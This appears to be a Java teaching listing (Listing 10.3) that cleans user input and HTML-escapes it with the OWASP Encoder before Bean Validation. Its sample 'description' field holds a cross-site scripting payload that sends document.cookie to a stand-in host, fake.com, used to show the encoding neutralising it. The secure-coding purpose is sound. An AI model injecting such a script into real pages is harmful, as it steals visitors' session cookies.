package chapter10.listing103;

import chapter10.listing102.UserRegistrationDTO;
import jakarta.validation.ConstraintViolation;
import jakarta.validation.Validation;
import jakarta.validation.Validator;
import jakarta.validation.ValidatorFactory;
import lombok.extern.slf4j.Slf4j;
import org.owasp.encoder.Encode;

import java.util.Set;

/**
 * Listing 10.3 – Demonstration of input cleaning and validation.
 *
 * <p>This example shows how to sanitize user-supplied strings before applying
 * Jakarta Bean Validation constraints defined in {@link UserRegistrationDTO}.</p>
 */
@Slf4j
public class ValidationDemo {

  /**
   * Sanitizes a raw user input string.
   *
   * <p>The method trims leading and trailing whitespace, normalizes spacing
   * around apostrophes and dashes, converts the string to lowercase, and
   * escapes HTML characters using the OWASP Encoder.</p>
   *
   * @param input the raw user-supplied text, possibly null
   * @return a cleaned and HTML-escaped version of the input, or null if the input was null
   */
  public static String cleanInput(String input) {
    if (input == null) return null;
    String cleaned = input.trim();
    cleaned = cleaned.replaceAll("\\s*(['’])\\s*", "$1");
    cleaned = cleaned.replaceAll("\\s*(-)\\s*", "$1");
    cleaned = cleaned.toLowerCase();
    cleaned = Encode.forHtmlContent(cleaned);
    return cleaned;
  }

  public static void main(String[] args) {
    UserRegistrationDTO dto = UserRegistrationDTO.builder().firstName(cleanInput("  alice  "))
      .lastName(cleanInput(" o '  Malley  "))
      .email(cleanInput("  ALICE.oMalley@EXAMPLE.COM ")).age(30)
      .phoneNumber(cleanInput(" +1 555 123 456 "))
      .description(cleanInput("<script>document.location='http://fake" +
        ".com/cookie?data='+document.cookie</script>"))
      .build();
    log.info("Dto result  {}", dto);
  }
}
